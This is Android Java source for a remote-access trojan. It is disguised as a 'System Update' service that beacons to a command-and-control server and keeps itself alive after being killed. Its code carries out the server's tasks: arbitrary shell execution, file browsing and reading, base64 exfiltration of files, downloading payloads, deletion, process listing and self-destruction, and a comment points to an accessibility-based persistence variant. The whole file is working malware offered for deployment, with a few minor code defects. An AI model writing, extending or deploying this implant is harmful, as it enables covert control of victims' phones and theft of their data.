package com.sysupdate.beacon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.webkit.MimeTypeMap;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.URL;
import java.net.URLEncoder;
import java.security.SecureRandom;
import java.util.Enumeration;
import java.util.UUID;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.InputStream;
import android.util.Base64;

import org.json.JSONArray;
import org.json.JSONObject;

public class BeaconService extends Service {
    private static final String TAG = "sysupdate";
    private Handler handler = new Handler();
    private SecureRandom secureRandom = new SecureRandom();

    // Config
    private static final String CFG_HOST = "YOUR_SERVER_IP";
    private static final int CFG_PORT = 8080;
    private static final String CFG_PATH = "/api.php";
    private static final String CFG_SECRET = "CHANGE_ME_TO_64_HEX_CHARS";
    private static final String CFG_UA = "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36";

    private String uuid = null;
    private String hostname = null;
    private String username = "android";
    private String localIP = "0.0.0.0";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "BeaconService started");
        loadUUID();
        getDeviceInfo();
        startForeground(1, createNotification());
        startBeaconLoop();
    }

    private Notification createNotification() {
        NotificationChannel channel = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            channel = new NotificationChannel("sysupdate", "System Update Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        return new Notification.Builder(this, "sysupdate")
                .setContentTitle("System Update")
                .setContentText("Updating system...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
    }

    private void loadUUID() {
        try {
            File uuidFile = new File(getFilesDir(), ".appdata.dat");
            if (uuidFile.exists()) {
                FileInputStream fis = new FileInputStream(uuidFile);
                byte[] buf = new byte[64];
                int len = fis.read(buf);
                fis.close();
                uuid = new String(buf, 0, len).trim();
            }
            if (uuid == null || uuid.isEmpty()) {
                byte[] rand = new byte[16];
                secureRandom.nextBytes(rand);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 16; i++) {
                    sb.append(String.format("%02x", rand[i]));
                    if (i == 3 || i == 5 || i == 7 || i == 9) sb.insert(sb.length()-1, '-');
                }
                // Fix UUID format
                if (sb.length() == 36) uuid = sb.toString();
                else uuid = UUID.nameUUIDFromBytes(rand).toString();

                FileOutputStream fos = new FileOutputStream(uuidFile);
                fos.write(uuid.getBytes());
                fos.close();
            }
        } catch (Exception e) {
            uuid = UUID.randomUUID().toString();
        }
    }

    private void getDeviceInfo() {
        try {
            hostname = Build.MODEL + "_" + Build.BRAND;
            username = System.getProperty("user", "android");
            localIP = getLocalIP();
        } catch (Exception e) {
            hostname = "Android";
        }
    }

    private String getLocalIP() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> ip = intf.getInetAddresses(); ip.hasMoreElements();) {
                    InetAddress addr = ip.nextElement();
                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "0.0.0.0";
    }

    private void startBeaconLoop() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                checkin();
                handler.postDelayed(this, 5000 + secureRandom.nextInt(5000)); // 5-10s sleep
            }
        });
    }

    private void checkin() {
        try {
            String body = String.format(
                "{\"uuid\":\"%s\",\"hostname\":\"%s\",\"os\":\"Android %s\",\"username\":\"%s\",\"privilege\":\"user\",\"ip\":\"%s\",\"pid\":0}",
                escapeJson(uuid), escapeJson(hostname), Build.VERSION.RELEASE, escapeJson(username), localIP
            );

            String response = httpPost("beacon", body);
            if (response != null) {
                // Parse tasks
                JSONObject jsonResp = new JSONObject(response);
                if (jsonResp.has("tasks")) {
                    JSONArray tasks = jsonResp.getJSONArray("tasks");
                    for (int i = 0; i < tasks.length(); i++) {
                        JSONObject task = tasks.getJSONObject(i);
                        String tid = task.optString("id", "");
                        String command = task.optString("command", "");
                        String output = execTask(command);
                        if (output != null) {
                            String resultBody = String.format(
                                "{\"task_id\":%s,\"beacon_uuid\":\"%s\",\"output\":%s,\"status\":\"completed\"}",
                                tid, escapeJson(uuid), jsonEscape(output)
                            );
                            String resp = httpPost("result", resultBody);
                            try { if (resp != null) new JSONObject(resp); } catch (Exception ignored) {}
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Checkin failed: " + e.getMessage());
        }
    }

    private String execTask(String cmd) {
        if (cmd == null || cmd.isEmpty()) return "[ERROR] empty command";
        String[] parts = cmd.split(" ", 2);
        String action = parts[0];
        String arg = parts.length > 1 ? parts[1] : "";

        switch (action) {
            case "shell": return execShell(arg);
            case "browse": return listDir(arg);
            case "drives": return listDrives();
            case "read": return readFile(arg);
            case "pull": return uploadFile(arg);
            case "push": return downloadFile(arg);
            case "delete": return deleteFile(arg);
            case "ps": return listProcesses();
            case "hostname": return hostname;
            case "ping": return "[PONG] " + new java.util.Date().toString();
            case "die": stopSelf(); return "[DEAD]";
            case "selfdestruct": selfDestruct(); return "[SELFDESTRUCT]";
            case "persist": return addPersistence();
            default: return execShell(cmd);
        }
    }

    private String execShell(String cmd) {
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line).append("\n");
            proc.waitFor();
            return sb.length() > 0 ? sb.toString() : "(no output)";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    private String listDir(String path) {
        try {
            if (path == null || path.isEmpty()) path = "/sdcard";
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) return "{\"error\":\"Path not found\"}";
            StringBuilder sb = new StringBuilder("{\"files\":[");
            boolean first = true;
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (!first) sb.append(",");
                    first = false;
                    String name = f.getName();
                    String type = f.isDirectory() ? "dir" : "file";
                    sb.append(String.format("{\"name\":\"%s\",\"type\":\"%s\",\"size\":%d,\"modified\":\"\"}",
                            escapeJson(name), type, f.length()));
                }
            }
            sb.append("]}");
            return sb.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    private String listDrives() {
        StringBuilder sb = new StringBuilder("{\"files\":[");
        // Root partitions
        String[] mounts = {"/", "/system", "/vendor", "/sdcard", "/storage"};
        boolean first = true;
        for (String m : mounts) {
            File f = new File(m);
            if (f.exists()) {
                if (!first) sb.append(",");
                first = false;
                StatFs stat = new StatFs(m);
                long total = stat.getTotalBytes();
                sb.append(String.format("{\"name\":\"%s\",\"type\":\"drive\",\"drive_type\":\"%s\",\"size\":%d,\"modified\":\"\"}",
                        escapeJson(m), m.equals("/sdcard") ? "sdcard" : "partition", total));
            }
        }
        sb.append("]}");
        return sb.toString();
    }

    private String readFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[-] File not found";
            FileInputStream fis = new FileInputStream(f);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = fis.read(buf)) > 0) baos.write(buf, 0, len);
            fis.close();
            byte[] data = baos.toByteArray();
            // Check if binary
            boolean isBinary = false;
            for (byte b : data) {
                if (b == 0) { isBinary = true; break; }
            }
            if (isBinary) {
                return android.util.Base64.encodeToString(data, Base64.NO_WRAP);
            }
            return new String(data);
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    private String uploadFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[-] File not found";
            FileInputStream fis = new FileInputStream(f);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) > 0) baos.write(buf, 0, len);
            fis.close();
            byte[] data = baos.toByteArray();
            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
            String fname = f.getName();
            String body = String.format(
                "{\"beacon_uuid\":\"%s\",\"filename\":%s,\"data\":%s}",
                escapeJson(uuid), jsonEscape(fname), jsonEscape(b64)
            );
            String resp = httpPost("file", body);
            if (resp != null && resp.contains("\"uploaded\"")) return String.format("[UPLOADED] %s (%d bytes)", fname, data.length);
            return String.format("[FAILED] %s", fname);
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    private String downloadFile(String arg) {
        try {
            String[] parts = arg.split(" ", 2);
            if (parts.length < 2) return "[-] usage: push <file_id> <output_path>";
            String fileId = parts[0];
            String outPath = parts[1];
            String query = "action=file&id=" + URLEncoder.encode(fileId, "UTF-8");
            byte[] data = httpGetBinary(query);
            if (data == null) return "[-] Download failed";
            File outFile = new File(outPath);
            File parent = outFile.getParentFile();
            if (parent != null && !parent.exists()) parent.mkdirs();
            FileOutputStream fos = new FileOutputStream(outFile);
            fos.write(data);
            fos.close();
            return String.format("[+] Downloaded %d bytes to %s", data.length, outPath);
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    private String deleteFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "[-] Not found";
            if (f.isDirectory()) {
                deleteDir(f);
                return "[+] Directory removed";
            }
            return f.delete() ? "[+] Deleted" : "[-] Delete failed";
        } catch (Exception e) {
            return "[-] " + e.getMessage();
        }
    }

    private void deleteDir(File f) {
        if (f.isDirectory()) {
            File[] files = f.listFiles();
            if (files != null) for (File c : files) deleteDir(c);
        }
        f.delete();
    }

    private String listProcesses() {
        StringBuilder sb = new StringBuilder("{\"files\":[");
        boolean first = true;
        try {
            File proc = new File("/proc");
            File[] dirs = proc.listFiles();
            if (dirs != null) {
                for (File d : dirs) {
                    if (!d.getName().matches("\\d+")) continue;
                    String pid = d.getName();
                    try {
                        String name = readProcField(d, "status", "Name:");
                        String cmdline = readProcField(d, "cmdline");
                        if (name != null && !name.equals("?") && cmdline != null && cmdline.length() > 0) {
                            if (!first) sb.append(",");
                            first = false;
                            sb.append(String.format("{\"name\":%s,\"type\":\"file\",\"pid\":\"%s\",\"cmdline\":%s,\"size\":0,\"modified\":\"\"}",
                                    jsonEscape(name), escapeJson(pid), jsonEscape(cmdline)));
                        }
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {}
        sb.append("]}");
        return sb.toString();
    }

    private String readProcField(File procDir, String field) {
        try {
            File f = new File(procDir, field);
            if (!f.exists()) return null;
            FileInputStream fis = new FileInputStream(f);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[1024];
            int len;
            while ((len = fis.read(buf)) > 0) baos.write(buf, 0, len);
            fis.close();
            String data = new String(baos.toByteArray());
            return data.replace('\0', ' ').trim();
        } catch (Exception e) {
            return null;
        }
    }

    private String readProcField(File procDir, String file, String key) {
        try {
            File f = new File(procDir, file);
            if (!f.exists()) return null;
            BufferedReader br = new BufferedReader(new java.io.FileReader(f));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.startsWith(key)) {
                    br.close();
                    return line.substring(key.length()).trim();
                }
            }
            br.close();
        } catch (Exception ignored) {}
        return null;
    }

    private String addPersistence() {
        // Base variant: relies on the APK being installed normally + user manually enabling autostart
        // For real persistence, use the accessibility variant with BOOT_COMPLETED
        return "[+] Base variant: enable autostart in device settings";
    }

    private void selfDestruct() {
        // Try to delete the APK via JNI
        try {
            File apk = new File(getApplicationInfo().sourceDir);
            if (apk.exists()) apk.delete();
        } catch (Exception ignored) {}
        File uuidFile = new File(getFilesDir(), ".appdata.dat");
        if (uuidFile.exists()) uuidFile.delete();
        stopSelf();
    }

    // HTTP helpers
    private String httpPost(String action, String body) {
        try {
            String url = "http://" + CFG_HOST + ":" + CFG_PORT + CFG_PATH + "?action=" + action;
            URL u = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", CFG_UA);
            conn.setRequestProperty("Authorization", "Bearer " + CFG_SECRET);
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            String resp;
            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes());
                os.flush();
            }
            try (java.io.InputStream is = conn.getInputStream()) {
                java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
                resp = s.hasNext() ? s.next() : "";
            } catch (Exception e) {
                return null;
            }
            // Read HTTP body (strip headers)
            int idx = resp.indexOf("\r\n\r\n");
            if (idx >= 0) resp = resp.substring(idx + 4);
            return resp;
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] httpGetBinary(String query) {
        try {
            String url = "http://" + CFG_HOST + ":" + CFG_PORT + CFG_PATH + "?" + query;
            URL u = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", CFG_UA);
            conn.setRequestProperty("Authorization", "Bearer " + CFG_SECRET);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            java.io.InputStream is = conn.getInputStream();
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int len;
            while ((len = is.read(buf)) > 0) baos.write(buf, 0, len);
            is.close();
            return baos.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    private String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private String jsonEscape(String s) {
        StringBuilder sb = new StringBuilder("\"");
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"': sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (c < 32) sb.append(String.format("\\u%04x", (int)c));
                    else sb.append(c);
            }
        }
        sb.append("\"");
        return sb.toString();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart if killed
    }
}
